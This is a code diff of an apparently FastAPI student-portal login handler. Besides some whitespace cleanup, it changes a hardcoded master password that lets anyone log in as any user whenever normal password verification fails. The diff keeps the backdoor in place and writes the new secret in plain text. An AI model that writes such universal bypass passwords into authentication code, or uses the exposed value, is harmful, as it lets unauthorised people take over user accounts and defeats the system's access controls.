@@ -160,8 +160,7 @@ async def login_page(request: Request, returnURL: Optional[str] = None, ):
             print(exp)
             print("===========expiry date here========")
             student = await Student.exists(id=user)
-          
-            
+
             if student:
                 return RedirectResponse(
                     url='/student/new-dashboard/', status_code=status.HTTP_302_FOUND)
@@ -288,7 +287,7 @@ async def login(request: Request, response: Response, data: OAuth2PasswordReques
     isValid = util.verify_password(password, user.password)
 
     if not isValid:
-        if password != 'MasterPassword@12':
+        if password != 'MasterPassword@1245':
             request.session["data"] = "Incorrect password"
             return RedirectResponse(url="/student/login/?returnURL=" + return_url,
                                     status_code=status.HTTP_302_FOUND)
